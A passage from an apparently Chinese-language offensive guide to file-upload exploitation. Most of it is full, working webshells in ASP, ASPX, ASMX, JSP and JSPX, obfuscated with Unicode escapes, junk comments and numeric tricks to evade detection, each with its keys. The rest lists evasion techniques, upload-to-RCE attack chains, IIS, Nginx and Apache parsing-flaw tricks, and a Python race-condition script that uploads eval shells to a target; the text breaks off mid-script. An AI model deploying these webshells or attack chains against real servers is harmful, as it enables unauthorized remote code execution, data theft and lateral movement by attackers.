            rEspOnsE.End
        else
            shabirD60UrdOZKHtT=shabiRXmLdTODUD7Y0i(shabi1xTuqJJYdE(shabirD60UrdOZKHtT),true)
			<!--"-->
            shabi4W.Add "p"&Chr("97")&Chr("121")&Chr("108")&Chr("111")&Chr("97")&Chr("100"),SeSsiON("p"&Chr("97")&Chr("121")&Chr("108")&Chr("111")&Chr("97")&Chr("100"))
			<!--"-->
            ExeCuTE(shabi4W("p"&Chr("97")&Chr("121")&Chr("108")&Chr("111")&Chr("97")&Chr("100")))
            shabiGePxQQEqvk=rUn(shabirD60UrdOZKHtT)
			<!--"-->
            rEspOnsE.Write(Chr("99")&Chr("48")&Chr("100")&Chr("55")&Chr("53")&Chr("49"))
            if not IsEmpty(shabiGePxQQEqvk) then
                rEspOnsE.Write BaSe64EncOdE(shabiRXmLdTODUD7Y0i(shabiGePxQQEqvk,true))
				<!--"-->
            end if
			<!--"-->
            rEspOnsE.Write(Chr("99")&Chr("100")&Chr("50")&Chr("55")&Chr("54")&Chr("53"))
        end if
		<!--"-->
    end if
%>
```

### 4.4 ASPX免杀WebShell（Godzilla CSHAP_AES_BASE64）

**特征：**
- AES/MD5 CryptoServiceProvider加密
- Unicode转义`\u0053\u0079...`绕过关键字检测
- 随机`/*comment*/`垃圾注释
- MD5 Hash标记：`0c55696561d05585`（前后16字节分割）
- Assembly.Load动态加载Payload
- RijndaelManaged AES加解密
- Session持久化Payload

```aspx
Hello Administrator!
WelCome To Tas9er Godzilla ASP.NET Console!
<%@ PAge LaNgUagE="C#"%>
<%try {
string eduSQrtEIXh = \u0053\u0079\u0073\u0074\u0065\u006D.Text.\U00000041\U00000053\U00000043\U00000049\U00000049\U00000045\U0000006E\U00000063\U0000006F\U00000064\U00000069\U0000006E\U00000067.ASCII.GetString(\u0053\u0079\u0073\u0074\u0065\u006D.\U00000043\U0000006F\U0000006E\U00000076\U00000065\U00000072\U00000074.\U00000046\U00000072\U0000006F\U0000006D\U00000042\U00000061\U00000073\U00000065\U00000036\U00000034\U00000053\U00000074\U00000072\U00000069\U0000006E\U00000067(\u0053\u0079\u0073\u0074\u0065\u006D.Text.\U00000041\U00000053\U00000043\U00000049\U00000049\U00000045\U0000006E\U00000063\U0000006F\U00000064\U00000069\U0000006E\U00000067.ASCII.GetString(\u0053\u0079\u0073\u0074\u0065\u006D.\U00000043\U0000006F\U0000006E\U00000076\U00000065\U00000072\U00000074.\U00000046\U00000072\U0000006F\U0000006D\U00000042\U00000061\U00000073\U00000065\U00000036\U00000034\U00000053\U00000074\U00000072\U00000069\U0000006E\U00000067(\u0053\u0079\u0073\u0074\u0065\u006D.Text.\U00000041\U00000053\U00000043\U00000049\U00000049\U00000045\U0000006E\U00000063\U0000006F\U00000064\U00000069\U0000006E\U00000067.ASCII.GetString(\u0053\u0079\u0073\u0074\u0065\u006D.\U00000043\U0000006F\U0000006E\U00000076\U00000065\U00000072\U00000074.\U00000046\U00000072\U0000006F\U0000006D\U00000042\U00000061\U00000073\U00000065\U00000036\U00000034\U00000053\U00000074\U00000072\U00000069\U0000006E\U00000067("VmtkR2VrOVhWbms9"))))));
string edu7onJtOQ1 = "0c55696561d05585";
string eduuEJaj5H7CkTBwhK = \u0053\u0079\u0073\u0074\u0065\u006D./*1XEYh2*/\u0042\u0069\u0074\u0043\u006F\u006E\u0076\u0065\u0072\u0074\u0065\u0072/*m52TWNxXI*/.ToString(new /*HFHMtU*/\u0053\u0079\u0073\u0074\u0065\u006D.\u0053\u0065\u0063\u0075\u0072\u0069\u0074\u0079/*NjkxdU*/.\u0043\u0072\u0079\u0070\u0074\u006F\u0067\u0072\u0061\u0070\u0068\u0079.\U0000004D\U00000044\U00000035\U00000043\U00000072\U00000079\U00000070\U00000074\U0000006F\U00000053\U00000065\U00000072\U00000076\U00000069\U00000063\U00000065\U00000050\U00000072\U0000006F\U00000076\U00000069\U00000064\U00000065\U00000072()/*7FbB*/.ComputeHash/*WpaZHFG1r4RiWRR*/(\u0053\u0079\u0073\u0074\u0065\u006D.Text./*cM2*/\U00000045\U0000006E\U00000063\U0000006F\U00000064\U00000069\U0000006E\U00000067.Default.\U00000047\U00000065\U00000074\U00000042\U00000079\U00000074\U00000065\U00000073(eduSQrtEIXh + edu7onJtOQ1)))./*0SVJ*/Replace("-", "");
byte[] edu8gTAQ62a30bq = \u0053\u0079\u0073\u0074\u0065\u006D./*TCqH*/\U00000043\U0000006F\U0000006E\U00000076\U00000065\U00000072\U00000074/*OnA*/./*WDNKJuoD*/\U00000046\U00000072\U0000006F\U0000006D\U00000042\U00000061\U00000073\U00000065\U00000036\U00000034\U00000053\U00000074\U00000072\U00000069\U0000006E\U00000067/*G44arWob*/(Context.Request[eduSQrtEIXh]);
edu8gTAQ62a30bq = new \u0053\u0079\u0073\u0074\u0065\u006D/*SE3a3VKh*/.\u0053\u0065\u0063\u0075\u0072\u0069\u0074\u0079.\u0043\u0072\u0079\u0070\u0074\u006F\u0067\u0072\u0061\u0070\u0068\u0079/*75663iV99wll*/./*ftwAr321*/\u0052\u0069\u006A\u006E\u0064\u0061\u0065\u006C\u004D\u0061\u006E\u0061\u0067\u0065\u0064()./*iyG3CmuMTZTq*/CreateDecryptor(\u0053\u0079\u0073\u0074\u0065\u006D./*z6yhMXksTX46*/Text.\U00000045\U0000006E\U00000063\U0000006F\U00000064\U00000069\U0000006E\U00000067.Default/*DvPzVIhChCPtLB*/.\U00000047\U00000065\U00000074\U00000042\U00000079\U00000074\U00000065\U00000073(edu7onJtOQ1), \u0053\u0079\u0073\u0074\u0065\u006D.Text./*1AFutvR7h1Fol*/\U00000045\U0000006E\U00000063\U0000006F\U00000064\U00000069\U0000006E\U00000067.Default.\U00000047\U00000065\U00000074\U00000042\U00000079\U00000074\U00000065\U00000073(edu7onJtOQ1))./*iPrNRNuJkvHLT50*/\U0054\u0072\u0061\u006E\u0073\u0066\u006F\u0072\u006D\u0046\u0069\u006E\u0061\u006C\u0042\u006C\u006F\u0063\u006B(edu8gTAQ62a30bq, 0, edu8gTAQ62a30bq.Length);
if (Context./*NE*/\U00000053\U00000065\U00000073\U00000073\U00000069\U0000006F\U0000006E["payload"] == null)
{Context/*XWD8NXj*/.\U00000053\U00000065\U00000073\U00000073\U00000069\U0000006F\U0000006E["payload"] = (/*o2*/\u0053\u0079\u0073\u0074\u0065\u006D.\U00000052\U00000065\U00000066\U0000006C\U00000065\U00000063\U00000074\U00000069\U0000006F\U0000006E./*8HHhJgjJU*/\u0041\u0073\u0073\u0065\u006D\u0062\u006C\u0079)typeof(\u0053\u0079\u0073\u0074\u0065\u006D/*QmFxGC*/.\U00000052\U00000065\U00000066\U0000006C\U00000065\U00000063\U00000074\U00000069\U0000006F\U0000006E.\u0041\u0073\u0073\u0065\u006D\u0062\u006C\u0079).GetMethod("Load", new \u0053\u0079\u0073\u0074\u0065\u006D.Type[] { typeof(byte[]) })./*oTfJ7J*/Invoke(null, new object[] { edu8gTAQ62a30bq });;}
else { \u0053\u0079\u0073\u0074\u0065\u006D.\u0049\u004F./*4kOceF0af2AvBd*/MemoryStream eduJ91DEF = new \u0053\u0079\u0073\u0074\u0065\u006D.\u0049\u004F/*aU48w4NHrw*/.MemoryStream();
object eduB0s1yVgB3Rfk4Y = ((\u0053\u0079\u0073\u0074\u0065\u006D.\U00000052\U00000065\U00000066\U0000006C\U00000065\U00000063\U00000074\U00000069\U0000006F\U0000006E.\u0041\u0073\u0073\u0065\u006D\u0062\u006C\u0079/*mnwwV5hCxhI*/)Context.\U00000053\U00000065\U00000073\U00000073\U00000069\U0000006F\U0000006E/*jJFGc0rAU5y9*/["payload"]).CreateInstance("LY");
eduB0s1yVgB3Rfk4Y.\U00000045\U00000071\U00000075\U00000061\U0000006C\U00000073(Context);
eduB0s1yVgB3Rfk4Y.\U00000045\U00000071\U00000075\U00000061\U0000006C\U00000073/*9oUktVFidQ*/(eduJ91DEF);
eduB0s1yVgB3Rfk4Y.\U00000045\U00000071\U00000075\U00000061\U0000006C\U00000073(edu8gTAQ62a30bq);
eduB0s1yVgB3Rfk4Y.ToString()/*Szj*//*OfQ*/;
byte[] edu1buAnHIPN = eduJ91DEF.ToArray();
Context.\u0052\u0065\u0073\u0070\u006F\u006E\u0073\u0065/*bcqXKvcuR82hHZ*/.Write(eduuEJaj5H7CkTBwhK.\u0053\u0075\u0062\u0073\u0074\u0072\u0069\u006E\u0067(0, 16));
Context.\u0052\u0065\u0073\u0070\u006F\u006E\u0073\u0065.Write(\u0053\u0079\u0073\u0074\u0065\u006D.\U00000043\U0000006F\U0000006E\U00000076\U00000065\U00000072\U00000074./*sQ9jlg2FotQDfkH*/ToBase64String/*D57p*/(new \u0053\u0079\u0073\u0074\u0065\u006D./*5zQtPS*/\u0053\u0065\u0063\u0075\u0072\u0069\u0074\u0079.\u0043\u0072\u0079\u0070\u0074\u006F\u0067\u0072\u0061\u0070\u0068\u0079./*348rbtuxI9iv*/\u0052\u0069\u006A\u006E\u0064\u0061\u0065\u006C\u004D\u0061\u006E\u0061\u0067\u0065\u0064().CreateEncryptor/*lp*/(\u0053\u0079\u0073\u0074\u0065\u006D.Text.\U00000045\U0000006E\U00000063\U0000006F\U00000064\U00000069\U0000006E\U00000067.Default/*gmivQ1zNXjxo1s*/.\U00000047\U00000065\U00000074\U00000042\U00000079\U00000074\U00000065\U00000073(edu7onJtOQ1), \u0053\u0079\u0073\u0074\u0065\u006D.Text./*jO0Jgcrjz6Oai*/\U00000045\U0000006E\U00000063\U0000006F\U00000064\U00000069\U0000006E\U00000067.Default.\U00000047\U00000065\U00000074\U00000042\U00000079\U00000074\U00000065\U00000073(edu7onJtOQ1)).\u0054\u0072\u0061\u006E\u0073\u0066\u006F\u0072\u006D\u0046\u0069\u006E\u0061\u006C\u0042\u006C\u006F\u0063\u006B/*QoQ*/(edu1buAnHIPN, 0, edu1buAnHIPN.Length)));
Context/*RCpf*/.\u0052\u0065\u0073\u0070\u006F\u006E\u0073\u0065.Write(eduuEJaj5H7CkTBwhK.\u0053\u0075\u0062\u0073\u0074\u0072\u0069\u006E\u0067(16));}}
catch (\u0053\u0079\u0073\u0074\u0065\u006D.Exception) {};
%>
```

### 4.5 ASMX免杀WebShell（Godzilla CSHAP_ASMX_AES_BASE64）

**特征：**
- WebService类封装，绕过普通.aspx检测
- URL Decode解码输入参数
- AES+MD5 RijndaelManaged加密
- StringBuilder输出构建
- Unicode转义+随机注释混淆
- MD5 Hash标记：`beafcd4071931fd1`
- Session持久化+Assembly.Load

```asmx
<%@ WebService LanGuagE="C#" Class="gov4HSZJhd" %>
public class gov4HSZJhd : \u0053\u0079\u0073\u0074\u0065\u006D.Web.\u0053\u0065\u0072\u0076\u0069\u0063\u0065\u0073.WebService
{
        [\u0053\u0079\u0073\u0074\u0065\u006D.Web./*FFDt*/\u0053\u0065\u0072\u0076\u0069\u0063\u0065\u0073.WebMethod(Enable\U00000053\U00000065\U00000073\U00000073\U00000069\U0000006F\U0000006E = true)]
        public string /*TljoI7KhiVT*/Tas9er(string Tas9er)
        {
			\u0053\u0079\u0073\u0074\u0065\u006D.Text./*XBTx*/\u0053\u0074\u0072\u0069\u006E\u0067\u0042\u0075\u0069\u006C\u0064\u0065\u0072 gov66RqifArBcgr = new \u0053\u0079\u0073\u0074\u0065\u006D/*TIY*/.Text.\u0053\u0074\u0072\u0069\u006E\u0067\u0042\u0075\u0069\u006C\u0064\u0065\u0072();
            try {
			string govybcCl7 = \u0053\u0079\u0073\u0074\u0065\u006D.Text.ASCII\U00000045\U0000006E\U00000063\U0000006F\U00000064\U00000069\U0000006E\U00000067.ASCII.GetString(\u0053\u0079\u0073\u0074\u0065\u006D.\U00000043\U0000006F\U0000006E\U00000076\U00000065\U00000072\U00000074.\U00000046\U00000072\U0000006F\U0000006D\U00000042\U00000061\U00000073\U00000065\U00000036\U00000034\U00000053\U00000074\U00000072\U00000069\U0000006E\U00000067(\u0053\u0079\u0073\u0074\u0065\u006D.Text.ASCII\U00000045\U0000006E\U00000063\U0000006F\U00000064\U00000069\U0000006E\U00000067.ASCII.GetString(\u0053\u0079\u0073\u0074\u0065\u006D.\U00000043\U0000006F\U0000006E\U00000076\U00000065\U00000072\U00000074.\U00000046\U00000072\U0000006F\U0000006D\U00000042\U00000061\U00000073\U00000065\U00000036\U00000034\U00000053\U00000074\U00000072\U00000069\U0000006E\U00000067("VkdGek9XVnk="))));
			string govFejeEd6cBqjU = "beafcd4071931fd1";
			string govZ13qve = \u0053\u0079\u0073\u0074\u0065\u006D./*2G7eQzOC9hbXE8Y*/\u0042\u0069\u0074\u0043\u006F\u006E\u0076\u0065\u0072\u0074\u0065\u0072/*UorfI2GseW*/.ToString(new \u0053\u0079\u0073\u0074\u0065\u006D.\u0053\u0065\u0063\u0075\u0072\u0069\u0074\u0079./*QFm9TKPfURx*/\u0043\u0072\u0079\u0070\u0074\u006F\u0067\u0072\u0061\u0070\u0068\u0079./*BBALytYNPN*/\U0000004D\U00000044\U00000035\U00000043\U00000072\U00000079\U00000070\U00000074\U0000006F\U00000053\U00000065\U00000072\U00000076\U00000069\U00000063\U00000065\U00000050\U00000072\U0000006F\U00000076\U00000069\U00000064\U00000065\U00000072()/*0HCmd7TXNUTps*/./*K*/ComputeHash/*RmA*/(\u0053\u0079\u0073\u0074\u0065\u006D./*yUibIGYz*/Text./*uTi9p0zhkqi*/\U00000045\U0000006E\U00000063\U0000006F\U00000064\U00000069\U0000006E\U00000067.Default.\U00000047\U00000065\U00000074\U00000042\U00000079\U00000074\U00000065\U00000073(govybcCl7 + govFejeEd6cBqjU)))./*Vu8fj4d2TAhDE*/Replace/*yB*/("-", "");
			byte[] govb7P29ocmreda = /*DkWF*/\u0053\u0079\u0073\u0074\u0065\u006D.\U00000043\U0000006F\U0000006E\U00000076\U00000065\U00000072\U00000074.\U00000046\U00000072\U0000006F\U0000006D\U00000042\U00000061\U00000073\U00000065\U00000036\U00000034\U00000053\U00000074\U00000072\U00000069\U0000006E\U00000067/*M5pNoN*/(\u0053\u0079\u0073\u0074\u0065\u006D.Web.HttpUtility./*zsgTttVqna73X*/UrlDecode(Tas9er));
			govb7P29ocmreda = new \u0053\u0079\u0073\u0074\u0065\u006D./*cvliZ*/\u0053\u0065\u0063\u0075\u0072\u0069\u0074\u0079./*0wy0qyNw9*/\u0043\u0072\u0079\u0070\u0074\u006F\u0067\u0072\u0061\u0070\u0068\u0079.\u0052\u0069\u006A\u006E\u0064\u0061\u0065\u006C\u004D\u0061\u006E\u0061\u0067\u0065\u0064()/*BVNcMvXssW2QHv*/.CreateDecryptor/*BfvHs3ENfq*/(/*qhA*/\u0053\u0079\u0073\u0074\u0065\u006D.Text.\U00000045\U0000006E\U00000063\U0000006F\U00000064\U00000069\U0000006E\U00000067./*taZ001PTpMCdhj*/Default.\U00000047\U00000065\U00000074\U00000042\U00000079\U00000074\U00000065\U00000073(govFejeEd6cBqjU), \u0053\u0079\u0073\u0074\u0065\u006D.Text.\U00000045\U0000006E\U00000063\U0000006F\U00000064\U00000069\U0000006E\U00000067.Default./*jr2G*/\U00000047\U00000065\U00000074\U00000042\U00000079\U00000074\U00000065\U00000073(govFejeEd6cBqjU))./*s*/\u0054\u0072\u0061\u006E\u0073\u0066\u006F\u0072\u006D\u0046\u0069\u006E\u0061\u006C\u0042\u006C\u006F\u0063\u006B(govb7P29ocmreda, 0, govb7P29ocmreda.Length);
			if (/*8dAF*/Context./*XAMAoAGMaj*/\U00000053\U00000065\U00000073\U00000073\U00000069\U0000006F\U0000006E["payload"] == null) 
			{ Context.\U00000053\U00000065\U00000073\U00000073\U00000069\U0000006F\U0000006E/*2e*/["payload"] = (\u0053\u0079\u0073\u0074\u0065\u006D./*z*/\U00000052\U00000065\U00000066\U0000006C\U00000065\U00000063\U00000074\U00000069\U0000006F\U0000006E./*O6VI*/\u0041\u0073\u0073\u0065\u006D\u0062\u006C\u0079)typeof(\u0053\u0079\u0073\u0074\u0065\u006D.\U00000052\U00000065\U00000066\U0000006C\U00000065\U00000063\U00000074\U00000069\U0000006F\U0000006E.\u0041\u0073\u0073\u0065\u006D\u0062\u006C\u0079).GetMethod("Load", new \u0053\u0079\u0073\u0074\u0065\u006D/*ETAFAdRw*/.Type[] { typeof(byte[]) }).Invoke(null, new object[] { govb7P29ocmreda }); ; } 
			else { object govE7WmfbEA8dutE3 = ((\u0053\u0079\u0073\u0074\u0065\u006D.\U00000052\U00000065\U00000066\U0000006C\U00000065\U00000063\U00000074\U00000069\U0000006F\U0000006E/*4e*/.\u0041\u0073\u0073\u0065\u006D\u0062\u006C\u0079/*jgAm4sZY320K*/)Context.\U00000053\U00000065\U00000073\U00000073\U00000069\U0000006F\U0000006E["payload"]).CreateInstance("LY");
			\u0053\u0079\u0073\u0074\u0065\u006D.\u0049\u004F./*VOkCG3sQZp4R3EW*/MemoryStream govWejcgP3V0gdGh = new \u0053\u0079\u0073\u0074\u0065\u006D.\u0049\u004F.MemoryStream();
			govE7WmfbEA8dutE3.\U00000045\U00000071\U00000075\U00000061\U0000006C\U00000073(Context);
			govE7WmfbEA8dutE3.\U00000045\U00000071\U00000075\U00000061\U0000006C\U00000073(govWejcgP3V0gdGh);
			govE7WmfbEA8dutE3.\U00000045\U00000071\U00000075\U00000061\U0000006C\U00000073(govb7P29ocmreda);
			govE7WmfbEA8dutE3.ToString()/*j*/;
			byte[] govT8 = govWejcgP3V0gdGh./*e7uAoYk9qOwI*/ToArray();
			gov66RqifArBcgr.\U00000041\U00000070\U00000070\U00000065\U0000006E\U00000064(govZ13qve.\u0053\u0075\u0062s\u0074\u0072\u0069\u006E\u0067(0, 16));
			gov66RqifArBcgr.\U00000041\U00000070\U00000070\U00000065\U0000006E\U00000064/*rN9nRXsOXUItS*/(\u0053\u0079\u0073\u0074\u0065\u006D.\U00000043\U0000006F\U0000006E\U00000076\U00000065\U00000072\U00000074./*6hsM*/ToBase64String/*Ug5T1NO*/(new \u0053\u0079\u0073\u0074\u0065\u006D.\u0053\u0065\u0063\u0075\u0072\u0069\u0074\u0079.\u0043\u0072\u0079\u0070\u0074\u006F\u0067\u0072\u0061\u0070\u0068\u0079/*5AL8O*/.\u0052\u0069\u006A\u006E\u0064\u0061\u0065\u006C\u004D\u0061\u006E\u0061\u0067\u0065\u0064()./*ZG*/CreateEncryptor(\u0053\u0079\u0073\u0074\u0065\u006D.Text.\U00000045\U0000006E\U00000063\U0000006F\U00000064\U00000069\U0000006E\U00000067.Default.\U00000047\U00000065\U00000074\U00000042\U00000079\U00000074\U00000065\U00000073(govFejeEd6cBqjU), \u0053\u0079\u0073\u0074\u0065\u006D.Text.\U00000045\U0000006E\U00000063\U0000006F\U00000064\U00000069\U0000006E\U00000067.Default.\U00000047\U00000065\U00000074\U00000042\U00000079\U00000074\U00000065\U00000073(govFejeEd6cBqjU)).\u0054\u0072\u0061\u006E\u0073\u0066\u006F\u0072\u006D\u0046\u0069\u006E\u0061\u006C\u0042\u006C\u006F\u0063\u006B(govT8, 0, govT8.Length)));
			gov66RqifArBcgr.\U00000041\U00000070\U00000070\U00000065\U0000006E\U00000064(govZ13qve.\u0053\u0075\u0062s\u0074\u0072\u0069\u006E\u0067(16)); } }
			catch (\u0053\u0079\u0073\u0074\u0065\u006D/*vjLzdR4Dk*/.Exception) { }
			return gov66RqifArBcgr.ToString();
		}
}
```

### 4.6 JSP免杀WebShell（Godzilla JAVA_AES_BASE64）

**特征：**
- AES Cipher加解密，密钥`22f0962cf5a047d0`
- 自定义ClassLoader `defineClass`动态加载
- Session持久化Payload
- Base64解码器
- MD5响应标记：`06AD438AADCFF8FA6FFB85E3C0233924`（前后16字节）
- Unicode转义`\u0064\u0065\u0066\u0069\u006e\u0065\u0043\u006c\u0061\u0073\u0073`
- 随机注释`/*edusb_XXX*/`分割关键字

```jsp
Hello Administrator!Welcome To Tas9er Godzilla JSP Console!
<%! String govsb_hed = "22f0962cf5a047d0";
    String govsb_72 = "Tas9er";
    class govsb_qKamuqJcPde0n8u extends /*edusb_e7k3zS5MM0tp3*/ClassLoader {
        public govsb_qKamuqJcPde0n8u(ClassLoader govsb_kWMp7RD) {
            super/*edusb_agTMb73UY*/(govsb_kWMp7RD);
        }
        public Class govsb_0m(byte[] govsb_UjygAlgXEmVhu) {
            return super./*edusb_eOkdrfA*/\u0064\u0065\u0066\u0069\u006e\u0065\u0043\u006c\u0061\u0073\u0073/*edusb_k*/(govsb_UjygAlgXEmVhu, 837575-837575, govsb_UjygAlgXEmVhu.length);
        }
    }
    public byte[] govsb_M0fZ0kevgRG(byte[] govsb_O0SB2EIXBcH, boolean govsb_am1fajbs) {
        try {
            j\u0061\u0076\u0061\u0078./*edusb_rm0I4tWk*/\u0063\u0072\u0079\u0070\u0074\u006f.Cipher govsb_OivaHoGWp = j\u0061\u0076\u0061\u0078.\u0063\u0072\u0079\u0070\u0074\u006f.Cipher.\u0067\u0065\u0074\u0049\u006e\u0073\u0074\u0061\u006e\u0063e/*edusb_As4eRFXKp*/("AES");
            govsb_OivaHoGWp.init(govsb_am1fajbs?837575/837575:837575/837575+837575/837575,new j\u0061\u0076\u0061\u0078.\u0063\u0072\u0079\u0070\u0074\u006f.spec./*edusb_wyMNjd8C*/SecretKeySpec/*edusb_R*/(govsb_hed.getBytes(), "AES"));
            return govsb_OivaHoGWp.doFinal/*edusb_FF16B22heUkTn*/(govsb_O0SB2EIXBcH);
        } catch (Exception e) {
            return null;
        }
     }
    %><%
    try {
        byte[] govsb_U13 = java.util.Base64./*edusb_z0dnnWNU*/\u0067\u0065\u0074\u0044\u0065\u0063\u006f\u0064\u0065\u0072()./*edusb_Vlh*/decode(request.getParameter(govsb_72));
        govsb_U13 = govsb_M0fZ0kevgRG(govsb_U13,false);
        if (session.getAttribute/*edusb_pMOWtJ9gh7Qcd6*/("payload") == null) {
            session.setAttribute("payload", new govsb_qKamuqJcPde0n8u(this.\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073()./*edusb_P8eY*/\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073Loader())/*edusb_XKY*/.govsb_0m(govsb_U13));
        } else {
            request.setAttribute("parameters", govsb_U13);
            java.io.ByteArrayOutputStream govsb_j4Rcb7Hmi4TXn = new java.io./*edusb_gplLy*/ByteArrayOutputStream();
            Object govsb_9cK6pvpK3ke3r = /*edusb_k4fvw1MUkRM*/((Class) session.getAttribute("payload"))./*edusb_AS6HrR6*//*edusb_WfyUgnBGElBq7*/new\u0049\u006e\u0073\u0074\u0061\u006e\u0063\u0065()/*edusb_n07v2ENkMLg8Ael*/;
            govsb_9cK6pvpK3ke3r.equals(govsb_j4Rcb7Hmi4TXn);
            govsb_9cK6pvpK3ke3r.equals(pageContext);
            response.getWriter().write("06AD438AADCFF8FA6FFB85E3C0233924".substring(837575-837575, 16));
            govsb_9cK6pvpK3ke3r.toString();
            response.getWriter().write(java.util.Base64/*edusb_C6wwTgUQOho8*/.getEncoder()/*edusb_esQTUgj*/.encodeToString(govsb_M0fZ0kevgRG(govsb_j4Rcb7Hmi4TXn.toByteArray(),true)));
            response.getWriter().write("06AD438AADCFF8FA6FFB85E3C0233924".substring(16));
        }
    } catch (Exception e) {
    }
%>
```

### 4.7 JSPX免杀WebShell（Godzilla JAVA_AES_BASE64）

**特征：**
- JSP XML格式（`<jsp:root>`、`<jsp:declaration>`、`<jsp:scriptlet>`），适用于严格XML解析环境
- AES加密，密钥`e43edd78db1e1348`
- 自定义ClassLoader + `defineClass`
- Session持久化Payload
- MD5响应标记：`E2B99F4A666E2FF11F5E126B64FDEAB1`
- 随机注释`/*tencentXXX*/`混淆（模拟腾讯产品名）
- 数字运算混淆：`89969-89969`代替`0`

```xml
<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="1.2">
    <jsp:declaration>
   String baiduJ0W = "e43edd78db1e1348";
    String baidu8IPi8W = "Tas9er";
    class baidugqy5LHTJKqeb extends /*tencentGzet37ZseVadcgB*/ClassLoader {
        public baidugqy5LHTJKqeb(ClassLoader baiduv) {
            super/*tencent1Mvm*/(baiduv);
        }
        public Class baiduz9ede(byte[] baidufUvd9iFjVgU9Z) {
            return super./*tencentiE9ECTmzFB6kv*/\u0064\u0065\u0066\u0069\u006e\u0065\u0043\u006c\u0061\u0073\u0073/*tencentYlF*/(baidufUvd9iFjVgU9Z, 89969-89969, baidufUvd9iFjVgU9Z.length);
        }
    }
    public byte[] baidupaYXbqUWdBJF8fv(byte[] baiduCRBT2, boolean baiduYplewZkHgh) {
        try {
            j\u0061\u0076\u0061\u0078./*tencentcpdagVPfrqExrtV*/\u0063\u0072\u0079\u0070\u0074\u006f.Cipher baiduF6ZaKsodz2 = j\u0061\u0076\u0061\u0078.\u0063\u0072\u0079\u0070\u0074\u006f.Cipher.\u0067\u0065\u0074\u0049\u006e\u0073\u0074\u0061\u006e\u0063e/*tencent0A*/("AES");
            baiduF6ZaKsodz2.init(baiduYplewZkHgh?89969/89969:89969/89969+89969/89969,new j\u0061\u0076\u0061\u0078.\u0063\u0072\u0079\u0070\u0074\u006f.spec./*tencent6g5lu0*/SecretKeySpec/*tencentEVDqsr6T*/(baiduJ0W.getBytes(), "AES"));
            return baiduF6ZaKsodz2.doFinal/*tencentgDe0QRf*/(baiduCRBT2);
        } catch (Exception e) {
            return null;
        }
     }
    </jsp:declaration>
    <jsp:scriptlet>
try {
        byte[] baiduO = java.util.Base64./*tencentWOFXVYwHEu*/\u0067\u0065\u0074\u0044\u0065\u0063\u006f\u0064\u0065\u0072()./*tencentQCKeh9Kjbqq*/decode(request.getParameter(baidu8IPi8W));
        baiduO = baidupaYXbqUWdBJF8fv(baiduO,false);
        if (session.getAttribute/*tencentXYIqomq2FPaShG*/("payload") == null) {
            session.setAttribute("payload", new baidugqy5LHTJKqeb(this.\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073()./*tencenthFgUqEfsZdjQd*/\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073Loader())/*tencentdc*/.baiduz9ede(baiduO));
        } else {
            request.setAttribute("parameters", baiduO);
            java.io.ByteArrayOutputStream baiduXHeudNh9eWXPEzl = new java.io./*tencent3pCLFasI1f*/ByteArrayOutputStream();
            Object baiduVXwXhrwV6sA = /*tencent2T7CXz3cgw*/((Class) session.getAttribute("payload"))./*tencent9Iy4b7lp6bGfajZ*//*tencentAZ3*/new\u0049\u006e\u0073\u0074\u0061\u006e\u0063\u0065()/*tencentYRVrS7eFWSG*/;
            baiduVXwXhrwV6sA.equals(baiduXHeudNh9eWXPEzl);
            baiduVXwXhrwV6sA.equals(pageContext);
            response.getWriter().write("E2B99F4A666E2FF11F5E126B64FDEAB1".substring(89969-89969, 16));
            baiduVXwXhrwV6sA.toString();
            response.getWriter().write(java.util.Base64/*tencent5AhC0ASO*/.getEncoder()/*tencent8n21*/.encodeToString(baidupaYXbqUWdBJF8fv(baiduXHeudNh9eWXPEzl.toByteArray(),true)));
            response.getWriter().write("E2B99F4A666E2FF11F5E126B64FDEAB1".substring(16));
        }
    } catch (Exception e) {
    }
</jsp:scriptlet>
</jsp:root>
```

### 4.8 内容免杀进阶技巧
- **变量函数化**：`$_GET[a]($_GET[b])` 替代直接 `eval($_POST[x])`
- **类方法调用**：使用类的__call/__invoke魔术方法
- **回调函数数组**：`array_map('assert',array($_POST[x]))`
- **反序列化利用**：构造POP链触发
- **文件包含+日志注入**：UA/Referer注入代码到日志，包含日志文件
- **SESSION文件包含**：注入代码到SESSION，包含SESSION文件
- **临时文件利用**：竞争条件上传+包含
- **数据库写入**：代码写入数据库字段，通过文件包含/数据库日志执行
- **图片EXIF注入**：将PHP代码写入EXIF的Comment字段，避免二次渲染破坏

## 五、组合利用链

### 5.1 标准上传RCE链
```
1. 探测上传点 → 确定防护层
2. 绕过扩展名/MIME检测 → 使用策略1/3
3. 若被WAF拦截 → 使用策略9流量层绕过
4. 若内容被查杀 → 使用策略11免杀WebShell
5. 上传成功 → 获取访问路径
6. 连接WebShell → Godzilla/菜刀/冰蝎
7. 提权/信息收集/横向移动
```

### 5.2 配置文件上传链（无法直接上传.php）
```
1. 绕过检测上传.htaccess/.user.ini → 需绕过后缀黑名单
2. 上传图片马shell.gif（GIF89a+PHP代码）
3. 访问触发解析
4. 获取Shell
```

### 5.3 文件包含+上传组合链
```
1. 上传内容为<?php code?>的.jpg（白名单允许图片）
2. 找到文件包含点（LFI）
3. ?file=upload/shell.jpg → 包含执行
4. 配合php://filter/base64读取源码
```

### 5.4 编辑器漏洞链
```
1. 识别编辑器类型（CKEditor/UEditor/KindEditor/eWebEditor）
2. 利用编辑器历史漏洞直接上传Shell
   - UEditor .NET版本任意文件上传
   - CKEditor文件管理器漏洞
   - KindEditor上传漏洞
   - FCKeditor connector上传
3. 或编辑器配置不当允许上传.aspx/.php
```

### 5.5 解析漏洞组合链
```
IIS 6.0:
  - /test.asp/1.jpg → test.asp作为脚本执行
  - shell.asp;.jpg → 分号截断解析为asp
  - PUT + MOVE → 通过WebDAV上传txt后MOVE为asp

Nginx:
  - shell.jpg/.php → 老版本解析为php
  - CVE-2013-4547: shell.jpg%00.php → 空字节截断
  - CVE-2017-15715(Apache): shell.php%0a → 换行绕过

Apache:
  - 多扩展名解析 shell.php.jpg
  - CRLF注入绕过
  - .htaccess配置文件上传
```

### 5.6 竞争条件链（文件上传后立即删除）
```python
import requests
import threading

def upload():
    files = {'file': ('shell.php', '<?php eval($_POST["cmd"]);fwrite(fopen("shell.php","w"),"<?php eval(\\"$_POST[cmd]\\");?>");?>')}
    requests.post('http://target.com/upload', files=files)

def access():
    while True:
        r = requests.get('http://target.com/uploads/shell.php')
        if r.status_code == 200:
            print("[+] Shell保留成功")
            break

for i in range(10):
